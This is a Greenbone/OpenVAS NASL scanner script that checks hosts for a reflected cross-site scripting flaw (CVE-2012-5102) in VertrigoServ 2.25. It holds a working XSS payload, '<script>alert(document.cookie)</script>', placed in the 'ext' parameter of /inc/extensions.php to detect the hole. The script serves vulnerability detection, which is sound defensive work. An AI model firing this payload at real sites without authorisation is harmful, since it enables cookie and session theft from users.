if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802556" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_cve_id( "CVE-2012-5102" );
	script_bugtraq_id( 51293 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2012-01-09 12:11:55 +0530 (Mon, 09 Jan 2012)" );
	script_name( "VertrigoServ 'ext' Parameter Cross Site Scripting Vulnerability" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/47469/" );
	script_xref( name: "URL", value: "http://seclists.org/bugtraq/2012/Jan/33" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/521125" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/108391/INFOSERVE-ADV2011-11.txt" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "httpver.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "impact", value: "Successful exploitation will allow attackers to execute arbitrary
  web script or HTML in a user's browser session in the context of an affected site." );
	script_tag( name: "affected", value: "VertrigoServ version 2.25." );
	script_tag( name: "insight", value: "The flaw is caused by an input validation error in the 'ext'
  parameter in 'extensions.php' when processing user-supplied data." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running VertrigoServ and is prone to cross-site
  scripting vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
rcvRes = http_get_cache( item: "/index.php", port: port );
if(ContainsString( rcvRes, ">Welcome to VertrigoServ<" )){
	url = "/inc/extensions.php?mode=extensions&ext=<script>alert" + "(document.cookie)</script>";
	if(http_vuln_check( port: port, url: url, pattern: "<script>alert\\(document\\." + "cookie\\)</script>", check_header: TRUE )){
		security_message( port: port );
		exit( 0 );
	}
}
exit( 99 );

